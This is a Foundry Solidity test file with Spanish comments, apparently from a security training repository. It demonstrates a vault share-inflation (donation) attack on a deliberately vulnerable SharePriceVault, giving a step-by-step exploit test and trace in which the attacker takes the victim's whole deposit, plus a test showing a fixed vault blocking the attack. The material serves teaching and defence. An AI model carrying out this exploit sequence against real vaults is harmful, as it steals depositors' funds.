// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Test} from "forge-std/Test.sol";
import {MockERC20} from "../mocks/MockERC20.sol";
import {SharePriceVault} from "../../src/oracle-manipulation/target/SharePriceVault.sol";
import {SharePriceVaultFixed} from "../../src/oracle-manipulation/mitigations/SharePriceVaultFixed.sol";

contract OracleManipulation03Test is Test {
    MockERC20 token;
    SharePriceVault vault;
    SharePriceVaultFixed vaultFixed;

    address attacker = makeAddr("attacker");
    address victim = makeAddr("victim");

    function setUp() public {
        token = new MockERC20("TOKEN", "TOK");
        vault = new SharePriceVault(address(token));
        vaultFixed = new SharePriceVaultFixed(address(token));

        token.mint(attacker, 10_001 ether);
        token.mint(victim, 5000 ether);

        vm.prank(attacker);
        token.approve(address(vault), type(uint256).max);
        vm.prank(victim);
        token.approve(address(vault), type(uint256).max);
    }

    /// @dev Traza exacta: attacker deposita 1 wei (shares=1). Dona 10.000e18
    ///      TOKEN por transferencia directa -- totalAssets() (balance en vivo)
    ///      salta a 10.000e18+1 sin que totalShares se entere. victim deposita
    ///      5.000e18 de buena fe: shares = 5.000e18*1/(10.000e18+1) = 0 por
    ///      redondeo entero. attacker redime su unica accion y se lleva TODO
    ///      el balance: 15.000e18+1, incluido el deposito integro de victim.
    function test_exploit_vaultInflation() public {
        vm.startPrank(attacker);
        vault.deposit(1);
        token.transfer(address(vault), 10_000 ether);
        vm.stopPrank();

        vm.prank(victim);
        uint256 sharesVictim = vault.deposit(5000 ether);
        assertEq(sharesVictim, 0, "victim se queda sin acciones por redondeo entero");

        vm.prank(attacker);
        uint256 received = vault.redeem(1);

        assertEq(received, 15_000 ether + 1, "attacker se lleva su donacion + el deposito integro de victim");
    }

    /// @dev Mismo intento contra SharePriceVaultFixed: la donación directa
    ///      mueve el balance real del contrato, pero NO el contador interno
    ///      que usa totalAssets(). victim recibe shares justas (5.000e18,
    ///      1:1, como si la donación no hubiera pasado). attacker recupera
    ///      exactamente su 1 wei original -- cero beneficio.
    function test_mitigation_blocksVaultInflation() public {
        vm.prank(attacker);
        token.approve(address(vaultFixed), type(uint256).max);
        vm.prank(victim);
        token.approve(address(vaultFixed), type(uint256).max);

        vm.startPrank(attacker);
        vaultFixed.deposit(1);
        token.transfer(address(vaultFixed), 10_000 ether);
        vm.stopPrank();

        vm.prank(victim);
        uint256 sharesVictim = vaultFixed.deposit(5000 ether);
        assertEq(sharesVictim, 5000 ether, "victim recibe shares justas, la donacion no distorsiona el precio");

        vm.prank(attacker);
        uint256 received = vaultFixed.redeem(1);
        assertEq(received, 1, "attacker solo recupera su deposito original, sin beneficio");
    }
}
